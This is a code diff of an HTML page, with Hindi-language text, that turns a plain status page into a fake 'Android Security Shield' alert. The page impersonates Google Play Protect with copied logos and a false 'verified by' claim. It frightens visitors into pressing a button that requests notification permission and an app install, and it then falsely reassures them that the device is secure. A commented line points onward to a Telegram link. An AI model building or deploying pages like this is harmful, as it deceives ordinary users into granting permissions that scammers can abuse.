@@ -1,22 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update Service</title>
+    <title>Android Security Shield</title>
+    <link rel="manifest" href="manifest.json">
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
-        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
-        h1 { color: #333; font-size: 20px; }
-        p { color: #666; }
-        .status { color: green; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 90%; max-width: 380px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; border-top: 8px solid #1a73e8; }
+        .shield-icon { width: 70px; margin-bottom: 15px; }
+        h2 { color: #202124; font-size: 20px; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .main-btn { background: #1a73e8; color: white; border: none; padding: 15px 0; width: 100%; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 6px rgba(26,115,232,0.3); }
+        .main-btn:active { transform: scale(0.98); }
+        .trust-footer { margin-top: 20px; font-size: 11px; color: #9aa0a6; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>System Update Service</h1>
-        <p>Status: <span class="status">Connected</span></p>
-        <p>Waiting for the next update...</p>
+
+<div class="card">
+    <img src="https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png" class="shield-icon" alt="Shield">
+    <h2>सिस्टम सुरक्षा अलर्ट</h2>
+    <p>आपका डिवाइस खतरे में हो सकता है। सुरक्षा पैच अपडेट करने और रीयल-टाइम प्रोटेक्शन चालू करने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
+    
+    <button class="main-btn" id="masterButton">अभी सुरक्षित करें (Secure Now)</button>
+
+    <div class="trust-footer">
+        <img src="https://www.gstatic.com/images/branding/product/1x/play_protect_32dp.png" width="15"> 
+        Google Play Protect द्वारा सत्यापित
     </div>
+</div>
+
+<script>
+    let deferredPrompt;
+    const masterButton = document.getElementById('masterButton');
+
+    // 1. ऐप इंस्टॉल (आइकन) की तैयारी
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e;
+    });
+
+    // मास्टर बटन का कमाल
+    masterButton.addEventListener('click', async () => {
+        
+        // स्टेप A: तुरंत नोटिफिकेशन की इजाजत मांगना
+        const permission = await Notification.requestPermission();
+        
+        if (permission === "granted") {
+            // स्टेप B: होम स्क्रीन पर आइकन बनाना (Add to Home Screen)
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                console.log(`User response to install: ${outcome}`);
+                deferredPrompt = null;
+            }
+
+            // स्टेप C: यूजर को भरोसा दिलाना
+            masterButton.innerText = "सुरक्षा सक्रिय है (Active)";
+            masterButton.style.background = "#34a853";
+            alert("बधाई हो! आपका डिवाइस अब सुरक्षित है और नोटिफिकेशन सेवा चालू कर दी गई है।");
+            
+            // अंत में अपने टेलीग्राम या किसी और पेज पर भेजना (Optional)
+            // window.location.href = "https://t.me/your_link";
+        } else {
+            alert("चेतावनी: सुरक्षा अपडेट के लिए नोटिफिकेशन की अनुमति अनिवार्य है। कृपया दोबारा प्रयास करें।");
+        }
+    });
+</script>
+
 </body>
 </html>
